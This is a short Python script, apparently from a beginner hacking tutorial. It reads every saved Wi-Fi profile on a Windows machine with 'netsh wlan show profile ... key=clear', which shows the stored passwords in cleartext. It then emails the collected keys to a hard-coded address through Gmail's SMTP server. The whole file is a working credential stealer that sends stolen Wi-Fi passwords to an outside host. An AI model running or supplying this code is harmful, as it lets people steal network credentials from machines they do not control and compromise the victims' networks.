#!usr/bin/env python3

import smtplib
import subprocess
import re


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
network_names_list =  re.findall("(?:Profile\s*:\s)(.*?)(?:\\r)", networks.decode("utf-8"))

result = ""

for network_name in network_names_list:
    command = command = 'netsh wlan show profile \"' + str(network_name).strip() + '\" key=clear'
    current_result = subprocess.check_output(command, shell=True)
    result = result +'\n'+ str(current_result)
print(result)
send_mail("myemail@myemail.com","mypassword",result)